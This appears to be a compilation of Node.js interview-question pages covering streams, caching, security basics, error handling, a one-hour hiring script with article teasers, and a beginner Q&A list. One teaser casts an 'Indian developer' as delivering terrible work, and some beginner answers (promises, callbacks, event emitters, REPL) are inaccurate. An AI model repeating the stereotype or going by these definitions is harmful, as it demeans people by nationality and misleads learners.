Backpressure is a mechanism that handles the scenario where a readable stream is producing data faster than a writable stream can consume it. The writable stream sends a signal “back” to the readable stream, telling it to pause producing data. Once the writable stream is ready for more, it signals the readable stream to resume. The `pipe()` method handles this automatically, preventing memory from being overwhelmed by an oversized internal buffer.

17. How would you profile a Node.js application to find a performance bottleneck?
I would use Node.js’s built-in profiler, which leverages V8’s profiler. By running Node.js with the `–prof` flag, it generates a “tick” file. This file can then be processed with `node –prof-process` to generate a human-readable analysis of where CPU time is being spent. For more advanced, real-time analysis, tools like `0x`, Clinic.js, or commercial APM solutions can provide flame graphs and bubble graphs to visualize CPU usage and event loop delays.

18. What is the difference between `Buffer` and `string`?
A `string` in JavaScript is an immutable sequence of characters, typically UTF-16 encoded. A `Buffer` is Node.js’s way of handling raw binary data. It’s a mutable, fixed-size chunk of memory allocated outside the V8 heap. Buffers are essential for interacting with binary data streams, such as file I/O or TCP networking.

19. Explain how you could use caching to improve the performance of a backend service.
Caching can be implemented at multiple levels:

In-Memory Cache: Use a simple object or an LRU cache (`node-lru-cache`) to store frequently accessed data within a single Node.js instance. Fast but not shared between instances.
Distributed Cache: Use an external service like Redis or Memcached to store data that can be accessed by all instances of your application. Essential for microservices or clustered applications.
HTTP Caching: Use HTTP headers like `ETag`, `Cache-Control`, and `Last-Modified` to allow clients and proxies to cache responses.
Security & Error Handling
20. What are some common security vulnerabilities in Node.js applications and how do you prevent them?
Common vulnerabilities include:

Cross-Site Scripting (XSS): Sanitize user input and set appropriate `Content-Security-Policy` headers. Use templating engines that auto-escape output.
SQL/NoSQL Injection: Use parameterized queries or Object-Relational/Document Mappers (ORMs/ODMs) instead of string concatenation to build queries.
Insecure Deserialization: Avoid deserializing data from untrusted sources.
Using Components with Known Vulnerabilities: Regularly audit dependencies using `npm audit` and keep them updated.
Review the OWASP Node.js Security Cheat Sheet.
21. What is the difference between an error and an exception? How should you handle them?
In Node.js, the distinction is often about how they are handled.

Operational Errors: These are expected, recoverable runtime problems, like a failed network request or invalid user input. They should be handled gracefully, often by propagating an `Error` object via callbacks or rejected Promises.
Programmer Errors (Exceptions): These are bugs in the code, like reading a property of `undefined`. Ideally, they should be fixed. If they occur, the best practice is often to crash the application immediately and use a process manager like PM2 to restart it, preventing the application from entering an unknown state.
22. What is the purpose of the `domain` module, and why is it deprecated?
The `domain` module was an attempt to handle errors within a specific “domain” of I/O operations, effectively creating a `try…catch` for asynchronous operations. However, it was found to be unreliable and introduced more problems than it solved. It is now deprecated. The modern approach is to handle errors using the robust error handling capabilities of Promises and `async/await` (`try…catch`).

23. What are `child_process` and when would you use it over Worker Threads?
The `child_process` module allows you to spawn new processes. You would use it over Worker Threads when you need to:

Run a non-JavaScript program (e.g., executing a command line tool or a Python script).
Achieve true process isolation with separate memory spaces, which can be more resilient.
Leverage multiple CPU cores for a task without the complexity of shared memory.
Worker Threads are better for CPU-bound tasks within your existing Node.js application where you need efficient communication and memory sharing.
24. How can you prevent race conditions in a Node.js environment?
While Node.js is single-threaded, race conditions can still occur with I/O operations. For example, two requests might try to read a file, modify its contents, and write it back. The second write could overwrite the first. To prevent this, you need to ensure atomic operations. This can be done using:

Database Transactions: For operations involving a database.
Advisory Locking: Implementing a locking mechanism (e.g., using Redis `SETNX`) to ensure only one process can access a critical resource at a time.
Queues: Processing jobs that touch the same resource sequentially through a queue.
25. What is the `npm ci` command and how does it differ from `npm install`?
`npm install` (or `npm i`): Is used for adding, removing, or updating dependencies. It can modify the `package-lock.json` file.

`npm ci` (“clean install”): Is meant for automated environments like continuous integration (CI) pipelines. It provides faster, more reliable, and deterministic builds. It deletes `node_modules` before starting and installs dependencies exactly as specified in the `package-lock.json` file. It will fail if the lock file is out of sync with `package.json`.

1-hour NodeJS full-stack developer interview questions.
Follow this script to detect the best NodeJS / React developers in 1 hour.

At code.store we hire the best developers in Eastern Europe countries. I wanted to share with you our NodeJS/Fullstack job interview questions. So you can hire the best too.

Plan
Duration → 60 minutes minimum (2 hours is better)

What do these 12 programming languages say about you?
Tell me what your favorite language is, and I’ll tell you who you are.
medium.com

Phases
0–5 (10min) → introduction, General Questions
5–30 (25min) → Tech Knowledge
30–55 (25min) → Coding question
55–60 (5min) → Wrap-up
5 must-haves to get high-quality code with an offshore developer!
You tried hiring an Indian developer, and received the first deliverables, they were terrible. Sounds familiar? Your…
medium.com

General
Introduction. A couple of minutes about what you’re most interested in and excited about.
Tell me about your previous most exciting task.
Tell me about a tech project you’ve worked on in your spare time.
What are the benefits and the drawbacks of working in an Agile environment?
Did you perform code reviews? How do you approach code reviews and which process do you follow? Please send examples (3–4) of your code review comments.
Have you ever been assigned a task you were not familiar with? How did you handle it?
JavaScript, TypeScript:
What is the difference between == and ===? What to use when?
Difference between var, let & const? What to use when?
What is bind, call, apply and what's the difference?
What is Typescript? Why use it over JavaScript?
What are Generics?
How do you use TypeScript on Node.js projects?
What is the difference between arrow function and normal functions?
Node
Are you familiar with child_process module? What is it?
What is the difference between spawn and exec, forks? What are use cases?
Is there any reason to use child_process for intensive i/o work?
Worker threads, cluster module? What are use cases?
Why are top-level variables not global in modules?
What are cyclic module dependencies in Node?
When is it acceptable to use synchronous filesystem methods (like readFileSync)? Why do we use async usually?
What will the Node app do when the call stack and event loop queues are empty?
Coding is outdated, learn AI prompts
Code is only a transient way of communication between humans and machines in computer history, the future of coding is…
medium.com

Data structures
Which data structures did you recently use?
Difference between Array and HashMap (Dictionary)?
Speed of Insert/Access/Delete operations in Array and HashMap? Provide Big O for those operations.
MongoDB and Redis:
Why use MongoDB instead of SQL?
How do we typically model data in MongoDB? → embedded documents VS different collections, access pattern design, etc
How to search for complex nested and linked data in MongoDB? Give examples of previous experience with complex aggregates.
How to debug a slow aggregate in MongoDB?
What are use cases for Redis?
Can we expire a record from Redis?
SQL
Which SQL database did you use? Which do you prefer and why?
What is denormalization? When do we need it? What are the normal forms?
How to query data from two tables in a single query?
What is the difference between LEFT and RIGHT joins?
How do we debug a slow SQL query?
How do we fix a slow SQL query?
Microservices
How would you implement transactions in microservices architecture?
How would you implement communication between microservices?
How a single developer dropped AWS costs by 90%, then disappeared.
It’s Christmas and I just finished my last audit of a SaaS client. His story is worth telling. It’s a story about…
medium.com

React
What is Virtual DOM?
Did you work with SSR in React? How does it work?
What are fragments in React?
What are the rules of React hooks?
How to debug react app?
How can we pass data from one component to other components in React?
What is the most complex component have you ever made?
Have you ever used portals, render props, refs other React features?
CSS, HTML
What’re the difference between block, inline and inline-block elements?
How do you write CSS? Using some methodologies like Atomic CSS, or BEM? Or using Styled Components?
How do you specify units in the CSS? What are the ways to do it?
What is a CSS preprocessor?

15+ NodeJS interview questions with Answers for 1 to  2 years experience
Here is a list of frequently asked Node.js questions from interviews for 1 to 2 years of experience as web developers. You can revise these questions before going for a face-to-face interview or before attending any telephonic interview. 

1. What is Node.js?
Answer: Node.js is an open-source, runtime JavaScript environment built on Google Chrome's V8 engine.

node.js architecture explained


 

2. What is Node.js used for?
Answer: Node.js is used to create complex single-page applications, server-side applications, real-time applications, RESTful APIs, chat rooms, browser games, etc.
 

3. What is a callback function?
Answer: A callback is a function passed to another function as an argument. It is an asynchronous equivalent for a normal function. It is called when a given task is completed. Callback functions prevent any kind of blocking.
 

4. What is asynchronous programming?
Answer: Asynchronous programming is a design pattern in which the code is executed in a non-blocking way. In asynchronous, code is executed without any dependency and order.
 

5. What is NPM?
Answer: NPM stands for Node Package Manager. It is a Command Line Interface tool used for downloading and publishing packages. It is an online repository that hosts several JavaScript packages.



 

6. What is package.json and what is it used for?
Answer: The package.json file holds several metadata information regarding the project. It includes various fields such as name, description, and dependencies. It is used to give information to the node package manager to identify the project as well as handle the dependencies associated with it.
 

7. Why should we use Node.js?
Answer: We should use Node.js because:
It is asynchronous.
It is generally fast and it has great concurrency.
It is easier to build scalable network programs with Node.js
It rarely blocks.

8. What is the meaning of event-driven programming?
Answer: Event-driven programming is a programming paradigm in which the flow is determined by different events such as messages from other threads or programs. The application architecture of this programming technique is divided into two sections: 1) Event selection 2) Event handling.
 

9. What is callback hell? And how to avoid callback hell?
Answer: Callback hell is a problem caused by extensive nesting of callback functions. In such a condition, every callback takes an argument that is the result of the previous callbacks. Callback hell can be avoided by using event queues and promises.



10. What is a promise?
Answer: A promise in Node.js is a value returned by an asynchronous function. It indicates that a process carried out by the asynchronous function is completed.
 

11. Explain middleware?
Answer: A middleware is a type of function that has access to request and response objects. Along with these two objects, a middleware also has access to the function called next, which is used to call the next middleware function (if there is any).
 

12. Name the modules used for: a) File operations b) Web-based operations c) Buffer based operations
Answer: The module used for file operations is "fs", for web-based operations is "http", and for buffer-based operations is "buffer".
 

13. What is the meaning of REPL and why is it used?
Answer: REPL stands for READ, EVAL, PRINT, LOOP. By using the REPL bundled environment, it becomes easy to create Command Line Interface (CLI) applications.
 

14. What is an event loop?
Answer: Node.js is single-threaded. Still, it can perform non-blocking operations. This is possible because of the event loop. The event loop allows Node.js to perform non-block operations by assigning operations to the OS wherever and whenever possible.

node.js event loop


 

15. What is an event emitter
Answer: An event emitter in Node.js is a class that holds all those objects that can emit events.


That's all about the frequently asked Node.js interview questions for beginners and people with 1 to 2 years of experience in web development. As mentioned earlier, Node.js is wide and several questions can be taken out of it. In this article, we discussed the 15 commonly asked Node.js questions with answers.
